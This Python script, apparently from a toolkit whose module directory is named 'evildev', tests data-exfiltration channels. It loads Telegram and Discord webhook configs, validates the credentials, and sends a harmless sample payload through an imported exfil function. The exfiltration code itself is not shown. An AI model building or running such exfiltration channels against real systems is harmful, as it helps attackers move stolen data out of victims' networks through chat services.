#!/usr/bin/env python3
"""
Simple exfil test for Telegram or Discord
Usage: python exfil_simple_test.py [telegram|discord]
"""
import sys
import os
import json
from pathlib import Path
from dotenv import load_dotenv

# Load .env file
load_dotenv()

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent / 'evildev'))

from exfil import load_exfil_config
from logger import get_logger

logger = get_logger('exfil_test')

def test_telegram():
    """Test Telegram exfiltration"""
    print("\n" + "="*60)
    print("Testing Telegram Exfiltration")
    print("="*60)
    
    # Load config
    mgr = load_exfil_config('./exfil_config.telegram.json')
    if not mgr:
        print("❌ Failed to load Telegram config")
        return False
    
    if not mgr.channels:
        print("❌ No channels loaded")
        return False
    
    # Validate channel
    channel = mgr.channels[0]
    valid, error = channel.validate()
    if not valid:
        print(f"❌ Telegram validation failed: {error}")
        return False
    
    print("✅ Telegram credentials validated")
    
    # Test exfil with sample payload
    test_payload = {
        "type": "test",
        "timestamp": "2026-06-16T15:10:00Z",
        "message": "Exfil test from simplified webhook config",
        "status": "success"
    }
    
    print(f"\nSending test payload...")
    success = channel.exfil(test_payload)
    
    if success:
        print("✅ Telegram exfil test PASSED")
        return True
    else:
        print(f"❌ Telegram exfil test FAILED: {channel.last_error}")
        return False


def test_discord():
    """Test Discord exfiltration"""
    print("\n" + "="*60)
    print("Testing Discord Exfiltration")
    print("="*60)
    
    # Load config
    mgr = load_exfil_config('./exfil_config.discord.json')
    if not mgr:
        print("❌ Failed to load Discord config")
        return False
    
    if not mgr.channels:
        print("❌ No channels loaded")
        return False
    
    # Validate channel (Discord webhook doesn't validate, just checks URL exists)
    channel = mgr.channels[0]
    webhook_url = channel.config.get('webhook_url')
    
    if not webhook_url:
        print("❌ Discord webhook URL not configured")
        print("   Set DISCORD_WEBHOOK_URL environment variable")
        return False
    
    print("✅ Discord webhook URL configured")
    
    # Test exfil with sample payload
    test_payload = {
        "type": "test",
        "timestamp": "2026-06-16T15:10:00Z",
        "message": "Exfil test from simplified webhook config",
        "status": "success"
    }
    
    print(f"\nSending test payload to: {webhook_url[:50]}...")
    success = channel.exfil(test_payload)
    
    if success:
        print("✅ Discord exfil test PASSED")
        return True
    else:
        print(f"❌ Discord exfil test FAILED: {channel.last_error}")
        return False


if __name__ == '__main__':
    service = 'telegram'  # default
    
    if len(sys.argv) > 1:
        service = sys.argv[1].lower()
    
    if service == 'telegram':
        result = test_telegram()
    elif service == 'discord':
        result = test_discord()
    else:
        print(f"Unknown service: {service}")
        print("Usage: python exfil_simple_test.py [telegram|discord]")
        sys.exit(1)
    
    sys.exit(0 if result else 1)
